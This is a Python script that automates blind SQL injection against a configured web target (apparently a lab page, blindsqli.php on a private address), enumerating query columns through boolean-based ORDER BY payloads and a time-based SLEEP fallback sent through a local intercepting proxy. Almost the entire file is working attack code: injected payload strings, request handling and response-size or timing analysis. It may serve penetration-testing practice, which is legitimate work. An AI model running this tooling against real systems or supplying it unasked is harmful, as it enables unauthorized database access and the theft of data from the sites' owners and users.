import requests
import time
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# CONFIGURATION ZONE (MATCH TO TARGET PROFILE)
# ==========================================

# Change these 
TARGET_URL = "http://192.168.219.16/blindsqli.php"
PARAM_NAME = "user"
VALUE = "admin"
IS_GET_REQUEST = True

COOKIES = {'PHPSESSID': 'bde10d96950e1de84312dbb4659dffe0'}

# Metrics captured from your prior analysis
TRUE_SIZE = 1076   # Expected size of a valid query statement
FALSE_SIZE = 1022  # Expected size when query results drop/fail
SLEEP_TIME = 10

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# ==========================================

def send_request(payload):
    data_bundle = {PARAM_NAME: payload}
    if IS_GET_REQUEST:
        return requests.get(TARGET_URL, params=data_bundle, verify=False, proxies=PROXIES, cookies=COOKIES, timeout=SLEEP_TIME + 4)
    else:
        return requests.post(TARGET_URL, data=data_bundle, verify=False, proxies=PROXIES, cookies=COOKIES, timeout=SLEEP_TIME + 4)

def discover_columns_boolean():
    print("[+] Mode 1: Commencing Boolean-Based Column Enumeration...")
    
    for i in range(1, 50):
        # Syntax logic: If order by succeeds, the entire statement is TRUE (Matches TRUE_SIZE)
        # If column index is out of bounds, query fails, statement drops (Matches FALSE_SIZE)
        payload = f"{VALUE}' ORDER BY {i}#"
        
        try:
            r = send_request(payload)
            current_size = len(r.text)
            
            # If the response suddenly drops to our False baseline size
            if current_size == FALSE_SIZE:
                print(f"    [🔴] Column {i} triggered a FALSE response layout ({current_size} bytes).")
                print(f"    [🔴] Column boundary identified!")
                return i - 1
                
            print(f"    [*] Testing Column count {i}: Response returned normal size ({current_size} bytes).")
            
        except Exception as e:
            print(f"[-] Execution error on iteration {i}: {e}")
            break
            
    return None

def discover_columns_time():
    print("\n[+] Mode 2: Commencing Time-Based Column Enumeration...")
    print("    [*] (Used if page sizes remain perfectly symmetrical)")
    
    for i in range(1, 50):
        # Syntax logic: Execute an out-of-bounds query check using a safe subquery structure
        # If column 'i' exists, query is valid -> executes True path (sleep)
        # If column 'i' is invalid, query errors instantly -> execution halts without sleeping
        payload = f"{VALUE}' AND (SELECT IF(COUNT(*)>=0, SLEEP({SLEEP_TIME}), 0) FROM (SELECT 1) AS tmp ORDER BY {i})#"
        
        start = time.time()
        try:
            send_request(payload)
            elapsed = time.time() - start
            
            # If execution drops below our sleep threshold, the query structure errored out out-of-bounds
            if elapsed < SLEEP_TIME:
                print(f"    [🔴] Column {i} failed time delay execution instantly ({elapsed:.2f}s).")
                print(f"    [🔴] Column boundary identified!")
                return i - 1
                
            print(f"    [*] Testing Column count {i}: Success delay processed in {elapsed:.2f}s.")
            
        except requests.exceptions.Timeout:
            print(f"    [*] Testing Column count {i}: Standard timeout reached (Column exists).")
        except Exception:
            # If database crashes completely on structural syntax, catch the fall immediately
            return i - 1
            
    return None

if __name__ == "__main__":
    print("[*] Launching Dual-Method Blind Column Discovery Engine")
    print("="*60)
    
    # Try the faster Boolean profiling method first
    columns = discover_columns_boolean()
    
    # Fallback to Time-Based profiling if Boolean tracking returned inconclusive results
    if not columns:
        print("\n[-] Boolean tracking insufficient. Shifting to deep timing metrics...")
        columns = discover_columns_time()
        
    if columns:
        print(f"\n[🔴] FINAL ENUMERATION RESULT: Target query processes exactly {columns} columns.")
    else:
        print("\n[-] Automated mapping failed. Verify parameter names and injection context characters manually.")